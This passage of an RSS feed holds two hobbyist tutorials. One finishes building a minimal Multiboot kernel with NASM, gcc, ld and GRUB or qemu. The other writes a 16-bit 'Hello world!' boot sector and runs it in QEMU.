&lt;p&gt;Now, we have all our files ready to build the kernel. But, since we like to boot our kernel with the &lt;a href=&quot;http://t.umblr.com/redirect?z=%2F%2Fwww.gnu.org%2Fsoftware%2Fgrub%2F&amp;amp;t=ODNhYTQ5OTM5NDg5ZjYxNjExOTUxYWM1MTc1ZDMzMGFiNDU5ODVmYixJVHNWb3BUUw%3D%3D&amp;amp;b=t%3AlMu0rOs9jGwbQo_qiwGh_A&amp;amp;p=http%3A%2F%2Farjunsreedharan.org%2Fpost%2F82710718100%2Fkernel-101-lets-write-a-kernel&amp;amp;m=1&quot; data-href=&quot;//www.gnu.org/software/grub/&quot; target=&quot;_blank&quot;&gt;GRUB bootloader&lt;/a&gt;, there is one step left.&lt;/p&gt;
&lt;p&gt;There is a standard for loading various x86 kernels using a boot loader; called as &lt;strong&gt;Multiboot specification&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;GRUB will only load our kernel if it complies with the &lt;a href=&quot;http://t.umblr.com/redirect?z=%2F%2Fwww.gnu.org%2Fsoftware%2Fgrub%2Fmanual%2Fmultiboot%2Fmultiboot.html&amp;amp;t=MjBlYjFlNGZlYmNjMzBmZTFiMjNmMGJhYTJhOGIyZGQzZGMwNWQ4YyxJVHNWb3BUUw%3D%3D&amp;amp;b=t%3AlMu0rOs9jGwbQo_qiwGh_A&amp;amp;p=http%3A%2F%2Farjunsreedharan.org%2Fpost%2F82710718100%2Fkernel-101-lets-write-a-kernel&amp;amp;m=1&quot; data-href=&quot;//www.gnu.org/software/grub/manual/multiboot/multiboot.html&quot; target=&quot;_blank&quot;&gt;Multiboot spec&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;According to the spec, the kernel must contain a header (known as Multiboot header) within its first 8 KiloBytes.&lt;/p&gt;
&lt;p&gt;Further, This Multiboot header must contain 3 fields that are 4 byte aligned namely:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;a &lt;strong&gt;magic&lt;/strong&gt; field: containing the magic number &lt;strong&gt;0x1BADB002&lt;/strong&gt;, to identify the header.&lt;/li&gt;
&lt;li&gt;a &lt;strong&gt;flags&lt;/strong&gt; field: We will not care about this field. We will simply set it to zero.&lt;/li&gt;
&lt;li&gt;a &lt;strong&gt;checksum&lt;/strong&gt; field: the checksum field when added to the fields ‘magic’ and ‘flags’ must give zero.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;So our &lt;code&gt;kernel.asm&lt;/code&gt; will become:&lt;/p&gt;
&lt;pre class=&quot;prettyprint lang-asm&quot;&gt;
;;kernel.asm

;nasm directive - 32 bit
bits 32
section .text
        ;multiboot spec
        align 4
        dd 0x1BADB002            ;magic
        dd 0x00                  ;flags
        dd - (0x1BADB002 + 0x00) ;checksum. m+f+c should be zero

global start
extern kmain            ;kmain is defined in the c file

start:
  cli                   ;block interrupts
  mov esp, stack_space  ;set stack pointer
  call kmain
  hlt                   ;halt the CPU

section .bss
resb 8192               ;8KB for stack
stack_space:
&lt;/pre&gt;
&lt;p&gt;The &lt;strong&gt;dd&lt;/strong&gt; defines a double word of size 4 bytes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Building the kernel&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We will now create object files from &lt;code&gt;kernel.asm&lt;/code&gt; and &lt;code&gt;kernel.c&lt;/code&gt; and then link it using our linker script.&lt;/p&gt;
&lt;pre class=&quot;prettyprint lang-sh&quot;&gt;
nasm -f elf32 kernel.asm -o kasm.o
&lt;/pre&gt;
&lt;p&gt;will run the assembler to create the object file kasm.o in ELF-32 bit format.&lt;/p&gt;
&lt;pre class=&quot;prettyprint lang-sh&quot;&gt;
gcc -m32 -c kernel.c -o kc.o
&lt;/pre&gt;
&lt;p&gt;The ’-c ’ option makes sure that after compiling, linking doesn’t implicitly happen.&lt;/p&gt;
&lt;pre class=&quot;prettyprint lang-sh&quot;&gt;
ld -m elf_i386 -T link.ld -o kernel kasm.o kc.o
&lt;/pre&gt;
&lt;p&gt;will run the linker with our linker script and generate the executable named &lt;strong&gt;kernel&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Configure your grub and run your kernel&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;GRUB requires your kernel to be of the name pattern &lt;code&gt;kernel-&amp;lt;version&amp;gt;&lt;/code&gt;. So, rename the kernel. I renamed my kernel executable to kernel-701.&lt;/p&gt;
&lt;p&gt;Now place it in the &lt;strong&gt;/boot&lt;/strong&gt; directory. You will require superuser privileges to do so.&lt;/p&gt;
&lt;p&gt;In your GRUB configuration file &lt;code&gt;grub.cfg&lt;/code&gt; you should add an entry, something like:&lt;/p&gt;
&lt;pre&gt;
title myKernel
        root (hd0,0)
        kernel /boot/kernel-701 ro
&lt;/pre&gt;

&lt;p&gt;Don’t forget to remove the directive &lt;code&gt;hiddenmenu&lt;/code&gt; if it exists.&lt;/p&gt;
&lt;p&gt;Reboot your computer, and you’ll get a list selection with the name of your kernel listed.&lt;/p&gt;
&lt;p&gt;Select it and you should see:&lt;/p&gt;
&lt;img src=&quot;http://static.tumblr.com/gltvynn/yOdn443dr/mkernel.png&quot; alt=&quot;image&quot;/&gt;&lt;p&gt;That’s your kernel!!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PS:&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
* It’s always advisable to get yourself a virtual machine for all kinds of kernel hacking. * To run this on &lt;strong&gt;grub2 &lt;/strong&gt;which is the default bootloader for newer distros, your config should look like this:
&lt;pre class=&quot;prettyprint&quot;&gt;
menuentry 'kernel 701' {
        set root='hd0,msdos1'
        multiboot /boot/kernel-701 ro
}
&lt;/pre&gt;

* Also, if you want to run the kernel on the &lt;code&gt;qemu&lt;/code&gt; emulator instead of booting with GRUB, you can do so by:
&lt;pre class=&quot;prettyprint lang-sh&quot;&gt;
qemu-system-i386 -kernel kernel
&lt;/pre&gt;
&lt;p&gt;Also, see the next article in the Kernel series:&lt;br/&gt;&lt;a href=&quot;http://arjunsreedharan.org/post/99370248137/kernel-201-lets-write-a-kernel-with-keyboard-and&quot; target=&quot;_blank&quot;&gt;Kernel 201 - Let’s write a Kernel with keyboard and screen support&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;References and Thanks&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;1. &lt;a href=&quot;http://t.umblr.com/redirect?z=%2F%2Fwiki.osdev.org%2F&amp;amp;t=MmExMDNiNjU3YzU5MWMwN2FiMjg3MjRmMWRiZDVjOTY0ODcxYTZhNixJVHNWb3BUUw%3D%3D&amp;amp;b=t%3AlMu0rOs9jGwbQo_qiwGh_A&amp;amp;p=http%3A%2F%2Farjunsreedharan.org%2Fpost%2F82710718100%2Fkernel-101-lets-write-a-kernel&amp;amp;m=1&quot; data-href=&quot;//wiki.osdev.org/&quot; target=&quot;_blank&quot;&gt;wiki.osdev.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2. &lt;a href=&quot;http://t.umblr.com/redirect?z=%2F%2Fwww.osdever.net%2F&amp;amp;t=ODkwNGMxZTIzNzI0YzJlOTA1OThhZjYyZjNmZmRjNDI2MDRjNjBjYyxJVHNWb3BUUw%3D%3D&amp;amp;b=t%3AlMu0rOs9jGwbQo_qiwGh_A&amp;amp;p=http%3A%2F%2Farjunsreedharan.org%2Fpost%2F82710718100%2Fkernel-101-lets-write-a-kernel&amp;amp;m=1&quot; data-href=&quot;//www.osdever.net/&quot; target=&quot;_blank&quot;&gt;osdever.net&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;3. &lt;a href=&quot;http://t.umblr.com/redirect?z=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Fgrub%2Fmanual%2Fmultiboot%2Fmultiboot.html&amp;amp;t=ZjcxODhhMjU5NWJjMDM0MGJiZWM4ZDkyOWRmODcwYWM3MzRkYTlmMyxJVHNWb3BUUw%3D%3D&amp;amp;b=t%3AlMu0rOs9jGwbQo_qiwGh_A&amp;amp;p=http%3A%2F%2Farjunsreedharan.org%2Fpost%2F82710718100%2Fkernel-101-lets-write-a-kernel&amp;amp;m=1&quot; data-href=&quot;http://www.gnu.org/software/grub/manual/multiboot/multiboot.html&quot; target=&quot;_blank&quot;&gt;Multiboot spec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;4. Thanks to &lt;a href=&quot;http://t.umblr.com/redirect?z=%2F%2Frubenlaguna.com%2F&amp;amp;t=NmEyMGU0MTcxNTI2YmVjMTg0ODRhZjhkNjZjOTg3OTA3YTIzMWJhZSxJVHNWb3BUUw%3D%3D&amp;amp;b=t%3AlMu0rOs9jGwbQo_qiwGh_A&amp;amp;p=http%3A%2F%2Farjunsreedharan.org%2Fpost%2F82710718100%2Fkernel-101-lets-write-a-kernel&amp;amp;m=1&quot; data-href=&quot;//rubenlaguna.com/&quot; target=&quot;_blank&quot;&gt;Rubén Laguna&lt;/a&gt; from comments for grub2 config&lt;/li&gt;
&lt;/ol&gt;
&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/kernel&quot;&gt;kernel&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/operating-system&quot;&gt;operating system&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/c&quot;&gt;c&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/asm&quot;&gt;asm&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/assembly&quot;&gt;assembly&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/x86&quot;&gt;x86&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/cpu&quot;&gt;cpu&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/booting&quot;&gt;booting&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/programming&quot;&gt;programming&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/bootloader&quot;&gt;bootloader&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/grub&quot;&gt;grub&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/nasm&quot;&gt;nasm&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/ld&quot;&gt;ld&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/gcc&quot;&gt;gcc&lt;/a&gt;&lt;a rel=&quot;tag&quot; class=&quot;article-tag&quot; href=&quot;http://arjunsreedharan.org/tagged/technology&quot;&gt;technology&lt;/a&gt;&lt;p class=&quot;credit disclaimer visible-desktop&quot;&gt;Disclaimer: The views expressed here are solely those of the author in his private capacity and do not in any way represent the views of the author's employer or any organization associated with the author.&lt;/p&gt;


&lt;ol class=&quot;notes&quot;&gt;&lt;li class=&quot;note like tumblelog_opheliarand without_commentary&quot;&gt;&lt;a class=&quot;avatar_frame&quot; target=&quot;_blank&quot; href=&quot;https://opheliarand.tumblr.com/&quot; title=&quot;Senza titolo &quot; rel=&quot;nofollow&quot;&gt;&lt;img src=&quot;http://assets.tumblr.com/images/default_avatar/cube_open_16.png&quot; class=&quot;avatar&quot; alt=&quot;&quot;/&gt;&lt;/a&gt;&lt;span class=&quot;action&quot;&gt;&lt;a href=&quot;https://opheliarand.tumblr.com/&quot; title=&quot;Senza titolo&quot; rel=&quot;nofollow&quot;&gt;opheliarand&lt;/a&gt; liked this&lt;/span&gt;

&lt;/li&gt;




































&lt;li class=&quot;note more_notes_link_container&quot; id=&quot;more_notes_82710718100&quot;&gt;&lt;a class=&quot;more_notes_link&quot; rel=&quot;nofollow&quot; href=&quot;http://arjunsreedharan.org/post/82710718100/kernel-101-lets-write-a-kernel#&quot; onclick=&quot;this.style.display='none';document.getElementById('notes_loading_82710718100').style.display = 'block';if(window.ActiveXObject)var tumblrReq=new ActiveXObject('Microsoft.XMLHTTP');else if(window.XMLHttpRequest)var tumblrReq=new XMLHttpRequest();else return false;tumblrReq.onreadystatechange=function(){if(tumblrReq.readyState==4){var notes_html=tumblrReq.responseText.split('&amp;lt;!-- START '+'NOTES --&amp;gt;')[1].split('&amp;lt;!-- END '+'NOTES --&amp;gt;')[0]; if(window.tumblrNotesLoaded)if(tumblrNotesLoaded(notes_html)==false)return;var more_notes_link=document.getElementById('more_notes_82710718100');var notes=more_notes_link.parentNode;notes.removeChild(more_notes_link);notes.innerHTML+=notes_html;if(window.tumblrNotesInserted)tumblrNotesInserted(notes_html);}};tumblrReq.open('GET','/notes/82710718100/qyQgxNFSI?from_c=1397569224',true);tumblrReq.send();return false;&quot;&gt;Show more notes&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
<pubDate>Fri, 20 Oct 2017 08:31:53 +0000</pubDate>
<dc:creator>mmphosis</dc:creator>
<og:title>Kernel 101 – Let's write a Kernel</og:title>
<og:url>http://arjunsreedharan.org/post/82710718100/kernel-101-lets-write-a-kernel</og:url>
<og:description>Hello World, Let us write a simple kernel which could be loaded with the GRUB bootloader on an x86 system. This kernel will display a message on the screen and then hang. How does an x86 machine...</og:description>
<og:type>tumblr-feed:entry</og:type>
<og:image>//static.tumblr.com/gltvynn/MDYn443cj/one-does-not-kernel.jpg</og:image>
<dc:format>text/html</dc:format>
<dc:identifier>http://arjunsreedharan.org/post/82710718100/kernel-101-lets-write-a-kernel</dc:identifier>
</item>
<item>
<title>Writing a Bootloader</title>
<link>http://3zanders.co.uk/2017/10/13/writing-a-bootloader/</link>
<guid isPermaLink="true" >http://3zanders.co.uk/2017/10/13/writing-a-bootloader/</guid>
<description>&lt;p&gt;This article series explains how to write a tiny 32-bit x86 operating system kernel. We won’t do very much other than print &lt;code&gt;Hello world!&lt;/code&gt; to the screen in increasingly complicated ways! We’ll start off in assembly and then build up to writing C++!&lt;/p&gt;
&lt;p&gt;A &lt;a href=&quot;http://3zanders.co.uk/2017/10/13/writing-a-bootloader/writingabootloader.pdf&quot;&gt;presentation&lt;/a&gt; of this article series is also available.&lt;/p&gt;
&lt;p&gt;To follow along you’re going to need the NASM assembler and &lt;a href=&quot;https://www.qemu.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;QEMU&lt;/a&gt; to emulate a virtual machine for us. QEMU is great because you don’t have to worry about accidentally destroying your hardware with badly written OS code ;) You can install these on &lt;a href=&quot;https://msdn.microsoft.com/en-gb/commandline/wsl/install_guide&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Windows Subsystem for Linux&lt;/a&gt; or Ubuntu with this command:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span class=&quot;built_in&quot;&gt;sudo&lt;/span&gt; apt-get install nasm qemu
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;On a mac you can use homebrew:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;brew &lt;span class=&quot;operator&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;install&lt;/span&gt; nasm&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;A_Hello_World_Bootloader&quot;&gt;A Hello World Bootloader&lt;/h2&gt;
&lt;p&gt;When you press the power button the computer loads the BIOS from some flash memory stored on the motherboard. The BIOS initializes and self tests the hardware then loads the first 512 bytes into memory from the media device (i.e. the cdrom or floppy disk). If the last two bytes equal &lt;code&gt;0xAA55&lt;/code&gt; then the BIOS will jump to location &lt;code&gt;0x7C00&lt;/code&gt; effectively transferring control to the bootloader.&lt;/p&gt;
&lt;p&gt;At this point the CPU is running in 16 bit mode, meaning only the 16 bit registers are available. Also since the BIOS only loads the first 512 bytes this means our bootloader code has to stay below that limit, otherwise we’ll hit uninitialised memory!&lt;/p&gt;
&lt;p&gt;Let’s get hello world printing to the screen. To do this we’re going to use the ‘Write Character in TTY mode’ &lt;a href=&quot;https://en.wikipedia.org/wiki/BIOS_interrupt_call&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;BIOS Interrupt Call&lt;/a&gt; and the load string byte instruction &lt;code&gt;lobsb&lt;/code&gt; which loads byte at address &lt;code&gt;ds:si&lt;/code&gt; into &lt;code&gt;al&lt;/code&gt;. Here goes:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span class=&quot;built_in&quot;&gt;bits&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt; 
org &lt;span class=&quot;number&quot;&gt;0x7c00&lt;/span&gt; 
&lt;span class=&quot;label&quot;&gt;boot:&lt;/span&gt;
    &lt;span class=&quot;keyword&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;si&lt;/span&gt;,hello 
    &lt;span class=&quot;keyword&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;ah&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0x0e&lt;/span&gt; 
&lt;span class=&quot;string&quot;&gt;.loop&lt;/span&gt;:
    &lt;span class=&quot;keyword&quot;&gt;lodsb&lt;/span&gt;
    &lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;al&lt;/span&gt;,&lt;span class=&quot;literal&quot;&gt;al&lt;/span&gt; 
    &lt;span class=&quot;keyword&quot;&gt;jz&lt;/span&gt; halt  
    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0x10&lt;/span&gt; 
    &lt;span class=&quot;keyword&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;.loop&lt;/span&gt;
&lt;span class=&quot;label&quot;&gt;halt:&lt;/span&gt;
    &lt;span class=&quot;keyword&quot;&gt;cli&lt;/span&gt; 
    &lt;span class=&quot;keyword&quot;&gt;hlt&lt;/span&gt; 
&lt;span class=&quot;label&quot;&gt;hello:&lt;/span&gt; &lt;span class=&quot;pseudo&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Hello world!&quot;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;

&lt;span class=&quot;pseudo&quot;&gt;times&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;510&lt;/span&gt; - ($-$$) &lt;span class=&quot;pseudo&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; 
&lt;span class=&quot;pseudo&quot;&gt;dw&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0xaa55&lt;/span&gt; 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;If you save this file as &lt;code&gt;boot1.asm&lt;/code&gt; (or &lt;a href=&quot;http://3zanders.co.uk/2017/10/13/writing-a-bootloader/boot1.asm&quot;&gt;download it here&lt;/a&gt;) we can now use &lt;code&gt;nasm&lt;/code&gt; to compile it:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;nasm &lt;span class=&quot;operator&quot;&gt;-f&lt;/span&gt; bin boot1.asm -o boot1.bin
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;If we run &lt;code&gt;hexdump boot1.bin&lt;/code&gt; we can see that NASM created some code, padded some zeros then set the final two bytes to the magic number.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span class=&quot;number&quot;&gt;0000000&lt;/span&gt; be &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;c b4 &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;e ac &lt;span class=&quot;number&quot;&gt;08&lt;/span&gt; c0 &lt;span class=&quot;number&quot;&gt;74&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;04&lt;/span&gt; cd &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; eb f7 fa f4
&lt;span class=&quot;number&quot;&gt;0000010&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;65&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;c &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;c &lt;span class=&quot;number&quot;&gt;6f&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;77&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;6f&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;c &lt;span class=&quot;number&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt;
&lt;span class=&quot;number&quot;&gt;0000020&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt;
*
&lt;span class=&quot;number&quot;&gt;00001f&lt;/span&gt;0 &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt; aa
&lt;span class=&quot;number&quot;&gt;0000200&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;We can now run this thing! You can tell QEMU to boot off a floppy disk using &lt;code&gt;qemu-system-x86_64 -fda boot1.bin&lt;/code&gt; on Windows 10 you might need to stick &lt;code&gt;DISPLAY=:0&lt;/code&gt; in front to open the window from WSL. You should get something like this!&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://3zanders.co.uk/2017/10/13/writing-a-bootloader/boot1.png&quot; alt=&quot;Our Hello World bootloader&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;Next_Steps&quot;&gt;Next Steps&lt;/h2&gt;
&lt;p&gt;Next we can start investigating getting into Protected Mode in &lt;a href=&quot;http://3zanders.co.uk/2017/10/16/writing-a-bootloader2/&quot;&gt;Part 2&lt;/a&gt;!&lt;/p&gt;
</description>
<pubDate>Fri, 20 Oct 2017 07:51:17 +0000</pubDate>
<dc:creator>ingve</dc:creator>
<og:title>Writing a Bootloader Part 1</og:title>
<dc:format>text/html</dc:format>
<dc:identifier>http://3zanders.co.uk/2017/10/13/writing-a-bootloader/</dc:identifier>
</item>
</channel>
</rss>